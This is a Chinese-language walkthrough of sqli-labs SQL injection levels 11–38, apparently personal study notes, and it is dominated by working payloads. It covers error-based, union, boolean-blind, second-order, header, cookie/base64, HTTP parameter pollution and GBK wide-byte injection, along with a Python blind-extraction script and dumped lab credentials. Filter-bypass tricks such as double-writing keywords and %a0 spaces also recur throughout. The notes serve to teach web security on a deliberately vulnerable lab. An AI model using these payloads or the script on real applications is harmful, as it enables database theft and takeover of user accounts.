a' and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema="security"),1,31)),3) -- a



 获取 users 表的所有字段，

a' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="users"),1,31)),3) -- a



获取数据库用户的密码，用户名输入：

a' and updatexml(1,concat(0x7e,(select group_concat(user,password) from mysql.user where user = 'mituan')),3) -- a







#### Less-12-")
与less-11一样，注入点变为`")`

用 union 注入进行尝试：  
`1") union select 1,database() #`

显示出数据库：`security`



也可以判断字段数

a") order by 1 -- a

a") order by 2 -- a

a") order by 3 -- a

第3个字段排序时开始报错，确定返回结果的字段数为 2。



获取所有数据库，

a") union select 1,(select group_concat(schema_name) from information_schema.schemata)  -- a



获取 security 库的所有表，

a") union select 1,(select group_concat(table_name) from information_schema.tables where table_schema="security")  -- a



 获取 users 表的所有字段

a") union select 1,(select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="users")  -- a



 获取数据库用户的密码

a") union select 1,group_concat(id, ':', username, ':', password) from security.users -- a





#### Less-13-`')`-报错注入-布尔盲注
输入admin' ， 给出报错

`You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near ''admin'')  and password=('') LIMIT 0,1' at line 1`

输入`admin') #`或者`admin')-- (--后要有一个空格)`， 登录成功，说明存在注入点`')`

这一关中没有返回登录信息，只显示登录成功与否，可以用布尔盲注和报错注入，



##### 报错注入
```sql
#判断报错条件

a') and updatexml(1,0x7e,3) -- a

##返回：XPATH syntax error: '~'



#脱库
##尝试查询mysql.user表
a') and updatexml(1,concat(0x7e,(select group_concat(user,password) from mysql.user where user = 'mituan')),3) -- a

###返回：Only constant XPATH queries are supported


##改用information_schema查询所有数据库名
a') and updatexml(1,concat(0x7e,(select group_concat(schema_name)
from information_schema.schemata)),3) -- a

###返回：XPATH syntax error: '~information_schema,challenges,m'由于 updatexml() 只能返回约32个字符，所以只显示了部分数据库名
##可以分段查询：
a') and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),3) -- a
###返回：XPATH syntax error: '~information_schema'
a') and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1)),3) -- a
###返回：XPATH syntax error: '~challenges'
a') and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1)),3) -- a
###返回：XPATH syntax error: '~security'

#查询 security 数据库的所有表名
a') and updatexml(1,concat(0x7e,(select group_concat(table_name)
from information_schema.tables
where table_schema="security")),3) -- a

##返回：XPATH syntax error: '~emails,referers,uagents,users'


# 查询 users 表的所有列名
a') and updatexml(1,concat(0x7e,(select group_concat(column_name)
from information_schema.columns
where table_schema="security" and table_name="users")),3) -- a

##返回：XPATH syntax error: '~id,username,password'



#查表中内容（分段查询）：

a') and updatexml(1,concat(0x7e,(select concat(id,':',username,':',password) from security.users limit 0,1)),3) -- a

##返回：XPATH syntax error: '~1:Dumb:Dumb'

a') and updatexml(1,concat(0x7e,(select concat(id,':',username,':',password) from security.users limit 1,1)),3) -- a

##返回：XPATH syntax error: '~2:Angelina:I-kill-you'


```

常见的脱库语句 ：

```sql
# 获取所有数据库
select group_concat(schema_name)
from information_schema.schemata
 
# 获取 security 库的所有表
select group_concat(table_name)
from information_schema.tables
where table_schema="security"
 
# 获取 users 表的所有字段
select group_concat(column_name)
from information_schema.columns
where table_schema="security" and table_name="users"
```

+ `updatexml(1,0x7e,3)` 是一个MySQL XML处理函数，但可以用于报错注入。参数1：XML文档（这里随意填 `1`）。参数2：XPath表达式（`0x7e` 是 `~` 的十六进制，用于触发报错）。参数3：替换值（这里随意填 `3`）。
+ `concat(0x7e, (...))`：
    - `concat()` 用于拼接字符串，`0x7e`（`~`）用于触发报错回显。
+ `select group_concat(user,password) from mysql.user where user = 'mituan'`：
    - 尝试查询 `mysql.user` 表（MySQL系统用户表），但 `updatexml()` 不允许直接查询非常量数据。改用 `information_schema` （MySQL的系统数据库）查询数据库结构，而不是直接查 `mysql.user`。
+ 查数据库名 → `information_schema.schemata`
+ 查表名 → `information_schema.tables`
+ 查列名 → `information_schema.columns`
+ 查数据 → `select concat(id,username,password) from users`



##### 布尔盲注
判断长度：

判断当前使用数据库名字的长度是否大于1，

```plain
a') or length((database()))>1 -- a
```

1. 

枚举字符：a") or ascii(substr((database()),1,1))>1 -- a  
截取当前使用数据库名字的第一个字符，为了方便脚本的编写，这里将字符转换为ASCLL再判断。

判断第一个字符的ASCLL码是否大于1，用户名输入：

```plain
a') or ascii(substr((database()),1,1))>1 -- a
```

接下来使用穷举法，枚举该字符的所有可能性（对应的ASCLL码为：32~126）。

猜中第一个字符以后，再用此方法枚举其余字符



脚本：

```python
import requests
 
# 网站路径
url = "http://sqli-labs:8080/Less-13/"
# 判断长度的payload
payload_len = """a') or length(
    (database())
) ={n} -- a"""
# 枚举字符的payload
payload_str = """a') or ascii(
    substr(
        (database())
    ,{l},1)
) ={n} -- a"""
 
# post请求参数
data= {
    "uname" : "a') or 1 -- a",
    "passwd" : "1",
    "submit" : "Submit"
}
 
# 判断长度
def getLen(payload_len):
    length = 1
    while True:
        # 修改请求参数
        data["uname"] = payload_len.format(n = length)
        response = requests.post(url=url, data=data)
        # 出现此内容为登录成功
        if '../images/flag.jpg' in response.text:
            print('测试成功，长度为：', length)
            return length;
        else:
            print('正在测试长度：', length)
            length += 1
 
 
# 枚举字符
def getStr(length):
    str = ''
    # 从第一个字符开始截取
    for l in range(1, length+1):
        # 枚举字符的每一种可能性
        for n in range(32, 126):
            data["uname"] = payload_str.format(l=l, n=n)
            response = requests.post(url=url, data=data)
            if '../images/flag.jpg' in response.text:
                str += chr(n)
                print('第', l, '个字符枚举成功：',str )
                break
 
length = getLen(payload_len)
getStr(length)
```

其余脱库操作可以将`(database())`修改替换即可

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012509.png)







#### Less-14-`"`
和less-13一样，注入点改为`"`

#### Less-15-'-布尔盲注
不显示数据库的报错信息，报错注入无法使用，不会动态返回数据，无法使用联合注入。

注入点判断：

`admin' -- `

返回：![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013661.png)

`a' or 1 -- a`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013095.png)

`a' or 0 -- a`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013815.png)

可以确定注入点为单引号字符型



布尔盲注参考Less-13-方法二





#### Less-16-")-布尔盲注
判断注入点为`")`，接下来依旧是布尔盲注



#### Less-17-'-报错注入
这一关在用户名处输入的都没有实际作用，只有输入正确的用户名后，会返回`SUCCESSFULLY UPDATED YOUR PASSWORD`,所以注入点应该在密码处。

输入：admin/a'

返回报错：

`You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near 'admin'' at  line 1`

存在单引号注入点

```plain
#判断报错条件

a' and updatexml(1,0x7e,3) -- a

##返回：XPATH syntax error: '~'



#脱库
##查询所有数据库名
##可以分段查询：
1' and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),3) -- a
###返回：XPATH syntax error: '~information_schema'
1' and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1)),3) -- a
###返回：XPATH syntax error: '~challenges'
1' and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1)),3) -- a
###返回：XPATH syntax error: '~security'

###直接查询当前所在库
1' and updatexml(1,concat(0x7e,substr((database()),1,32)),3) -- a
返回：XPATH syntax error: '~security'


#查询 security 数据库的所有表名
1' and updatexml(1,concat(0x7e,(select group_concat(table_name)
from information_schema.tables
where table_schema="security")),3) -- a

##返回：XPATH syntax error: '~emails,referers,uagents,users'


# 查询 users 表的所有列名
1' and updatexml(1,concat(0x7e,(select group_concat(column_name)
from information_schema.columns
where table_schema="security" and table_name="users")),3) -- a

##返回：XPATH syntax error: '~id,username,password'



#查表中内容（分段查询）：

1' and updatexml(1,concat(0x7e,(select concat(id,':',username,':',password) from security.users limit 0,1)),3) -- a
##返回：You can't specify target table 'users' for update in FROM clause"你不能在 FROM 子句中指定目标表 'users' 进行更新"

1' and updatexml(1,concat(0x7e,(select concat(id,':',username,':',password) from (select * from users) as temp limit 0,1)),3) -- a
##返回：XPATH syntax error: '~1:Dumb:0'
1' and updatexml(1,concat(0x7e,(select concat(id,':',username,':',password) from (select * from users) as temp limit 1,1)),3) -- a
##返回：XPATH syntax error: '~2:Angelina:0'
```



#### Less-18-HTTP头注入
User-Agent:浏览器表明自己的身份（是哪种浏览器）

（由于php搭建的sqli-labs中18关修改User Agent后没有反应，所以这一关在buuctf打）





输入admin/admin后，返回：

`Your IP ADDRESS is: 10.244.166.11  
Your User Agent is: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0`

而对用户名和密码处都没有出现报错，所以注入点应该在User Agent,bp抓包改。

推断uname 和 passwd 字段都进行了强效的过滤，我们注入正确的 uname 和 passwd 之后再注入。此时发现当注入单引号闭合时，网页返回报错信息。

User Agent：`'`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013067.png)



注入 2 个连续的单引号，发现闭合成功，由此可见 2 个单引号分别闭合了 2 侧的单引号。

在注入的两个单引号之间可以插入其他 Sql 语句， updatexml() 报错注入语句。注意使用单引号闭合两侧的 Sql 语句时，相当于把它分割成了 2 部分，插入 updatexml() 报错时要用 OR 进行连接。

```sql
' OR updatexml(1,concat("!",database()),2) OR ' 
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013780.png)



表名：' OR updatexml(1,concat("!",(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'security')),2) OR ' 

字段名： ' OR updatexml(1,concat("!",(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = 'security' AND table_name = 'users')),2) OR ' 

字段内容：' OR (updatexml(1,concat('!',(SELECT concat_ws(':',username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1)) OR ' 

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013911.png)

#### Less-19-Referer POST 报错注入
当输入正确的用户名和密码后，返回：

`Your IP ADDRESS is: 10.244.166.11  
Your Referer is: http://e6eb7525-01ea-457a-b00c-6fffbc2de320.node5.buuoj.cn/Less-19/`

**Referer**是 HTTP 头的一个字段，用于告诉服务器该网页是从哪个页面链接过来的。



数据库名：Referer: ' OR updatexml(1,concat("!",database()),2) OR ' 

表名：Referer: ' OR updatexml(1,concat("!",(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'security')),2) OR ' 

字段名：Referer: ' OR updatexml(1,concat("!",(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = 'security' AND table_name = 'users')),2) OR ' 

字段内容：Referer: ' OR (updatexml(1,concat('!',(SELECT concat_ws(':',username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1)) OR ' 





#### Less-20-Cookie
**cookie** 是网站为了辨别用户身份，进行 Session 跟踪而储存在用户本地终端上的数据。想要回到登录页面，我们需要先把 cookie 清除掉。



首先输入正确的账户和密码测试，用bp抓包，抓到之后放行POST再抓GET，此时GET中会有cookie信息

此时就可以在cookie处进行测试注入

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013836.png)



闭合  
　Cookie: uname=admin' 

查询库名  
Cookie: uname=admin' and updatexml(1,concat(1,database()),1) and '

查询表名  
　Cookie: uname=admin' and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema='security')),1) and '

 查询字段  
　Cookie: uname=admin' and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users')),1) and '

 查询数据  
Cookie: uname=admin' and updatexml(1,concat(1,(select group_concat(username,'~',password) from users)),1) and '  
Cookie: uname=admin' and updatexml(1,concat(1,(select concat(username,'~',password) from users limit 0,1)),1) and '



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022013182.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022014352.png)









#### Less-21-Cookie-base64-')
这一关中的Cookie中uname参数的值是base64编码的。





抓包之后，`Cookie: uname=YWRtaW4%3D`

把uname的值粘贴到burpsuite的decoder1（编码工具）模块，尝试解码，url, html, base64，可以看到最终结果是admin%3D

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022014872.png)



把admin'放到decoder里面, 编码成base64,重放器发回去

从报错可知闭合是')

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022014836.png)





 这关还是可以用报错注入，除了**每条payload都要经过一次base64编码（如果base64编码结果包含等号还要进行url编码），再作为uname的值发送**，其他还是和Less20一样。





Cookie: uname= YWRtaW4nKSM=

admin')#



Cookie: uname=JykgVU5JT04gU0VMRUNUIDEsMiwzIw==

') union select 1,2,3#



Cookie: uname=JykgVU5JT04gU0VMRUNUIGRhdGFiYXNlKCksMiwzIw==

') union select database(),2,3#



Cookie: uname=JykgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSwyLDMgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIFdIRVJFIHRhYmxlX3NjaGVtYSA9ICdzZWN1cml0eScj

') union select group_concat(table_name),2,3 from information_schema.tables where table_schema = 'security'#



Cookie: uname=JykgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSksMiwzIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgV0hFUkUgdGFibGVfc2NoZW1hID0gJ3NlY3VyaXR5JyBBTkQgdGFibGVfbmFtZSA9ICd1c2Vycycj

') union select group_concat(column_name),2,3 from information_schema.columns where table_schema = 'security' and table_name = 'users'#



Cookie: dW5hbWU9JykgVU5JT04gU0VMRUNUIGdyb3VwX2NvbmNhdChjb25jYXQoIjoiLHVzZXJuYW1lLHBhc3N3b3JkKSksMiwzIEZST00gc2VjdXJpdHkudXNlcnMj

') union select group_concat(concat(":",username,password)),2,3 from security.users#

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022014093.png)





#### Less-22-Cookie-base64-"
原理和上一关一样一样的（注入点在cookie的uname参数值，payload需要base64编码，如果编码后有等号还需要url编码），就是闭合换成双引号了。



注入点变成"

Cookie: uname= IiM=

" # 



Cookie: uname=YSIgdW5pb24gc2VsZWN0IDEsMiwzIw==

a" union select 1,2,3#



Cookie: uname= IiB1bmlvbiBzZWxlY3QgZGF0YWJhc2UoKSwyLDMj

" union select database(),2,3#



Cookie: uname= IiB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpLDIsMyBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hID0gJ3NlY3VyaXR5JyM=

" union select group_concat(table_name),2,3 from information_schema.tables where table_schema = 'security'#



Cookie: uname= IiB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSwyLDMgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9zY2hlbWEgPSAnc2VjdXJpdHknIGFuZCB0YWJsZV9uYW1lID0gJ3VzZXJzJyM=

" union select group_concat(column_name),2,3 from information_schema.columns where table_schema = 'security' and table_name = 'users'#



Cookie: uname:= IiB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KGNvbmNhdCgiOiIsdXNlcm5hbWUscGFzc3dvcmQpKSwyLDMgZnJvbSBzZWN1cml0eS51c2VycyM=

" union select group_concat(concat(":",username,password)),2,3 from security.users#



#### Less-23-联合注入-过滤注释符
?id=1		正常返回数据		

?id=1'		`**Warning**:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in **D:\CTF-Tools\phpstudy_pro\WWW\sqli-labs\Less-23\index.php** on line **38**  
 You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near ''1'' LIMIT 0,1' at line 1 `				确定是单引号字符型

?id=1' or 1 --+ 

?id=1' and 1=1 --+

?id=1' and 1=2 #		都显示报错信息，应该是过滤了注释符





?id=33' union select 1,2,3' 	返回2，3

?id=21' union select 1,database(),3 and '		

返回数据库名security



?id=99' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' '

返回：emails,referers,uagents,users



?id=99' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' '

返回：id,username,password



?id=99' union select 1,group_concat(concat_ws(':',username,password)),3 from users where '1' = '1

返回：Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4



#### Less-24-二次注入
先创建一个新的用户和密码，admin'#/123456，使用这个用户登录后，输入admin/111/111更改密码，修改成功，之后使用admin/111登录成功，夺取了用户admin

原理：

`$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";`

当输入admin'#时：

`$sql = "UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass' ";`

sql语句就变成了：

`$sql = "UPDATE users SET PASSWORD='$pass' where username='admin'#`

此时，我们并不需要原密码进行验证，并且直接修改了其他用户的密码。这就是所谓的 **二次注入**，这种注入发生在用户提交的值被存储在数据库中，这个值可能被转义过。当这个值被其他模块调用时，会使用而不转义的原来的数据，如果这个数据是恶意注入，在不转义的情况下就会生效。



#### Less-25-过滤or、and-双写注入
这一关过滤了or和and 

?id=1'

**Warning**:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in **D:\CTF-Tools\phpstudy_pro\WWW\sqli-labs\Less-25\index.php** on line **37**  
 You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near ''1'' LIMIT 0,1' at line 1 

?id=1"

  Your Login name:Dumb  
Your Password:Dumb 

确定为单引号字符型注入



可以使用双写注入

?id=1' OorR 1 = 1--+

?id=1' aadnnd 1=1 --+

这样就可以绕过过滤了



?id=33' union select 1,2,3' 	返回2，3

?id=21' union select 1,database(),3 and '		

返回数据库名security



?id=99' union select 1,group_concat(table_name),3 from infoORrmation_schema.tables where table_schema='security' '

返回：emails,referers,uagents,users



?id=99' union select 1,group_concat(column_name),3 from infoORrmation_schema.columns where table_schema='security' aANDnd table_name='users' '

返回：id,username,password



?id=99' union select 1,group_concat(concat_ws(':',username,passwoORrd)),3 from users -- +

返回：Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:456,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4,【rr:ee,admin#:111111,admin'#:111】（这些是Less-24写入的新用户名和密码）







#### Less-25a-过滤or、and-双写注入-数字型
注入以下内容，以下内容全部网页都回显错误，说明该网页是数字型注入。

?id=1'--+  
?id=1')--+  
?id=1'))--+  
?id=1"--+  
?id=1")--+



注入：?id=1 OorR 1 = 1--+	返回正常





?id=-1 union select 1,2,3' 	返回2，3

?id=-1 union select 1,database(),3 and '		

返回数据库名security



?id=-1 union select 1,group_concat(table_name),3 from infoORrmation_schema.tables where table_schema='security' '

返回：emails,referers,uagents,users



?id=-1 union select 1,group_concat(column_name),3 from infoORrmation_schema.columns where table_schema='security' aANDnd table_name='users' '

返回：id,username,password



?id=-1 union select 1,group_concat(concat_ws(':',username,passwoORrd)),3 from users -- +

返回：Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:456,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4,【rr:ee,admin#:111111,admin'#:111】（这些是Less-24写入的新用户名和密码）









#### Less-26-过滤注释符和空格-报错注入
这一关过滤了注释符和空格，同时or、and也被过滤了



输入?id=1'时报错，确定存在单引号字符型注入

对于被过滤的字符，可以使用其他的字符进行替代，使用 “%a0” 或 “%0b” 替代空格，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”。例如：

```bash
-1' || 1 = 1  || '
```



```sql
?id=-1' || updatexml(1,concat(0x7e,database()),1) || '1'='1

?id=1' || updatexml(1, concat(0x7e, (SELECT (group_concat(table_name)) FROM (infoorrmation_schema.tables) WHERE (table_schema='security'))) ,1) || '1'='1

?id=1'||updatexml(1,concat(1,(SELECT (group_concat(column_name)) FROM (infoorrmation_schema.columns) WHERE (table_schema='security' %26%26 table_name = 'users'))) ,1) || '1'='1

?id=-1' || updatexml(1,concat(0x0a,(SELECT(group_concat(concat_ws(0x3a,username,passwoorrd))) FROM (security.users) WHERE (id = 1) ))  ,1) || '1'='1
```









#### Less-26a-过滤注释符，空格-union注入
和less-26过滤的基本一样，但这一关没有给出报错信息，无法用报错注入。此处就需要使用 URL 编码来代替空格，然后用 UNION 注入。判断有几列可用，别忘了 “ORDER” 中的 “or” 被过滤掉了。

?id=1'

?id=1')

?id=1') || ('		闭合成功

%a0	空格

%27	'

```sql
?id=1')%a0OorRDER%a0BY%a03||('1

?id=9999')%a0UNION%a0SELECT%a01,2,3%a0||('1

?id=9999')%a0UNION%a0SELECT%a01,database(),3%a0||('1

?id=9999')%a0UNION%a0SELECT%a01,group_concat(table_name),3%a0FROM%a0infoORrmation_schema.tables%a0WHERE%a0table_schema = 'security'%a0||('1')=('2

?id=9999')%a0UNION%a0SELECT%a01,group_concat(column_name),3%a0FROM%a0infoORrmation_schema.columns%a0WHERE%a0table_schema='security'%a0AandND%a0table_name='users'%a0||('1')=('2

?id=9999')%a0UNION%a0SELECT%a01,group_concat(concat_ws(":",username,passwoORrd)),3%a0FROM%a0users%a0WHERE%a0('1
```





#### Less-27-过滤union、select
```sql
?id=1'%a0ORDER%a0BY%a03||'1'='1

?id=9999'%a0UNION%a0SELECT%a01,2,3%a0or%a0'1'='1

?id=1111'%a0UniOn%a0SelECT%a01,2,3;%00


?id=9999'%a0UNiON%a0SElECT%a01,2,3%a0or%a0'1'='1

?id=9999'%a0UNiON%a0SELeCT%a01,database(),3%a0or%a0'1'='1

?id=9999'%a0UNiON%a0SELeCT%a01,group_concat(table_name),3%a0FROM%a0information_schema.tables%a0WHERE%a0table_schema = 'security'%a0or%a0'1'='2


```



#### Less-28



#### Less-29-HPP-'
**WAF (Web 应用防护系统)**是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。此处应该是对注入的参数进行了强效过滤，以此达到了 WAF 的作用。

绕过的方法是 **HPP (HTTP Parameter Pollution)**，也就是 HTTP 参数污染。我们注入两个同名的参数 id，第一个参数用于绕过 WAF，第二个参数用于注入。



```bash
?id=1&id=2
```

这种攻击成功绕过了 WAF，对第二个参数用单引号闭合并注释掉后面的内容。网页回显正常的参数，说明网页存在单引号闭合的字符型注入。

```bash
?id=1&id=2'--+
```

获取数据库信息

使用参数污染后，注入流程和 Less 1 一样。判断表有几列。

```bash
?id=1&id=1' ORDER BY 3--+
```



判断哪些列可用。

```bash
?id=1&id=-1' UNION SELECT 1,2,3--+
```



爆数据库名。

```bash
?id=1&id=-1' UNION SELECT 1,database(),3 --+
```



爆表名。

```bash
?id=1&id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security'--+
```



爆字段名。

```bash
?id=1&id=-1' union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema='security' and table_name='users'--+
```





爆出 users 表中的信息。

```bash
?id=1&id=-1' UNION SELECT 1,group_concat(concat_ws(':',username,password)),3 FROM security.users--+
```



#### Less-30-HPP-"
```sql
?id=1&id=1" ORDER BY 3--+

?id=1&id=-1" UNION SELECT 1,2,3--+

?id=1&id=-1" UNION SELECT 1,database(),3 --+

?id=1&id=-1" UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security'--+

?id=1&id=-1" union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema='security' and table_name='users'--+

?id=1&id=-1" UNION SELECT 1,group_concat(concat_ws(':',username,password)),3 FROM security.users--+
```



#### Less-31-HPP-")
```sql
?id=1&id=1") ORDER BY 3--+

?id=1&id=-1") UNION SELECT 1,2,3--+

?id=1&id=-1") UNION SELECT 1,database(),3 --+

?id=1&id=-1") UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security'--+

?id=1&id=-1") union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema='security' and table_name='users'--+

?id=1&id=-1") UNION SELECT 1,group_concat(concat_ws(':',username,password)),3 FROM security.users--+
```



#### Less-32,33,36-宽字节注入
注入正常的参数，网页回显正常信息。注入单引号对参数进行闭合，网页虽然返回了正确的信息，但是对单引号进行了转义。

?id=1'

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015124.png)

---

宽字节注入（**GBK/Big5 Character Encoding SQL Injection**）是一种利用数据库字符集与Web应用层字符编码不一致，结合转义函数（如`addslashes`）缺陷的SQL注入攻击方式。

**漏洞原理**

1. **字符集转换问题**
    - 当数据库使用GBK等多字节编码时，某些字符（如`0xbf5c`）会被视为一个合法字符（如`縗`），而非两个独立字节。
    - 攻击者通过输入`%bf%27`（`0xbf` + `'`的URL编码`%27`），触发字符集转换错误。
2. **转义函数绕过**
    - PHP的`addslashes`或`mysql_real_escape_string`会将单引号`'`转义为`\'`（即`%5c%27`）。
    - 当输入`%bf%27`时，转义后的字符串变为`%bf%5c%27`。由于GBK将`%bf%5c`解析为合法字符`縗`，剩下的`%27`（`'`）未被转义，导致注入。

---

对于一般的转义字符，我们是无法构造注入的 payload 的，但这并不代表网页就没有任何漏洞可以注入。对**宽字节注入漏洞**进行测试，注入如下参数。当数据库的编码采用 **GBK 国标码**时，虽然单引号还是会加上反斜杠从而被转义，但是 “%df” 会和反斜杠的 URL 编码 “%5C” 闭合，从而构成 GBK 国标码中的汉字“連”，使得用于转义的反斜杠被我们“吃掉”了。这种操作是由于 GBK 国标码是双字节表示一个汉字，因此导致了反斜杠和其他的字符共同表示为一个汉字。这可以让数据库的 SQL 查询了正确的参数(汉字)，从而可以使用 UNION 语句进行注入。

```sql
?id=1%df'
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015843.png)



```sql
?id=1%df' ORDER BY 3--+
?id=1%df' ORDER BY 4--+

?id=-1%df' UNION SELECT 1,2,3 --+

?id=-1%df' UNION SELECT 1,database(),3 --+

#此处数据库名要用十六进制 (HEX) 编码替代，避免单引号的使用。
?id=-1%df' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=0x7365637572697479--+

?id=-1%df' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=0x7365637572697479 and table_name=0x7573657273--+

?id=-1%df' UNION SELECT 1,group_concat(concat_ws(0x3a,username,password)),3 FROM security.users--+
```

#### Less-34,37-宽字节注入-POST
这一关是POST，抓包看一看，传入admin'/admin,同样对单引号转义，可以用宽字节注入

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015751.png)



uname=%df'&passwd=admin&submit=Submit

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015431.png)



uname=%df'--+&passwd=admin&submit=Submit		注释后页面正常，存在单引号注入

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015972.png)

```sql
uname=1%df' UNION SELECT 1,2 --+&passwd=&submit=Submit

uname=1%df' UNION SELECT database(),2 --+&passwd=&submit=Submit

uname=1%df' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=0x7365637572697479 --+&passwd=&submit=Submit

uname=1%df' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_schema=0x7365637572697479 AND table_name=0x7573657273 --+&passwd=&submit=Submit

uname=1%df' UNION SELECT group_concat(concat_ws(0x3a,username,password)),2 FROM security.users--+&passwd=&submit=Submit
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022015543.png)



#### Less-35-宽字节注入-数字型
直接用 ORDER BY 排序，网页回显正常数据，确定是数值型注入。由于数值型注入不涉及任何编码问题，因此任何转义操作都形同虚设。

```sql
?id=1 ORDER BY 3--+

#直接获取数据
?id=-1 UNION SELECT 1,group_concat(concat_ws(0x3a,username,password)),3 FROM security.users--+
```



#### Less-38-堆叠注入
这一关可以用Less-1的payload就可以获取数据，

```sql
?id=1
?id=1'
?id=1' --+
?id=1' order by 3 --+
?id=1' order by 4 --+
?id=-1' union select 1,2,3 --+

?id=-1' union select 1,database(),3 --+

?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security'--+

?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=0x7365637572697479--+
# 0x7365637572697479 代替 'security',通过十六进制编码 避免单引号使用，绕过转义和过滤机制。

?id=-1' union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema='security' and table_name='users'--+

?id=-1' union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=0x7365637572697479 and table_name=0x7573657273--+

?id=-1' UNION SELECT 1,group_concat(concat_ws(':',username,password)),3 FROM security.users--+

?id=-1' UNION SELECT 1,group_concat(concat_ws(0x3a,username,password)),3 FROM security.users--+

```





但这一关是用来练习堆叠注入的

---

